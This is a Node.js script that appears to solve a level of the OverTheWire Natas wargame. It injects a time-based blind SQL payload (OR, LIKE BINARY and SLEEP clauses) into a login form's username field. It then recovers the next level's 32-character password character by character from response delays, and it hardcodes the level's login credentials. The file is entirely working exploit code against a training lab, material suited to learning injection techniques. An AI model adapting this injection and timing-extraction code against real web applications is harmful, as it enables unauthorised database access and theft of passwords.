let username = 'natas17';
let password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw';


const request = require('request'),
      fs = require('fs'),
      $ = require('cheerio'); 
      rp = require('request-promise').defaults({transform : autoParse});
 
function autoParse(body, response) {
    if (response.headers['content-type'].includes('application/json')) {
        return JSON.parse(body);
    } else if (response.headers['content-type'].includes('text/html')) {
        return $.load(body);
    } else {
        return body;
    }
}

let options = {
    uri: `http://${username}.natas.labs.overthewire.org?debug=true`,
    method: 'POST',
    formData: {
        username: `" OR username="natas18" AND password LIKE BINARY "` + 'xvAh' + `%" AND SLEEP(1) OR username = "%%` 
    }
}

/*let start = new Date().getTime();
rp(options)
    .auth(username, password)
    .then($ => {
        let end = new Date().getTime();
        console.log($.text().trim(), end-start);
    });*/
//var start = new Date().getTime();

let characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
    .split('');
function bruteForce(currentPassword, charIndex){
    if(currentPassword.length == 32){
        console.log('PASSWORD: ' + currentPassword);
        return;
    }

    let startTime = new Date().getTime();
    let char = characters[charIndex];
    console.log('\033[2J');
    console.log(currentPassword + ' -----> ' + char);

    let options = {
        uri: `http://${username}.natas.labs.overthewire.org?debug=true`,
        method: 'POST',
        formData: {
            username: `" OR username="natas18" AND password LIKE BINARY "` + currentPassword + char + `%" AND SLEEP(5) OR username = "%%` 
        }
    }
    rp(options)
        .auth(username, password)
        .then($ => {
            let end = new Date().getTime();
            if(end - startTime > 5000){
                console.log('found char:' + char + '  --->' + currentPassword + char);
                bruteForce(currentPassword + char, 0);
            }else{
                bruteForce(currentPassword, ++charIndex);
            }
        });
}

bruteForce('', 0);
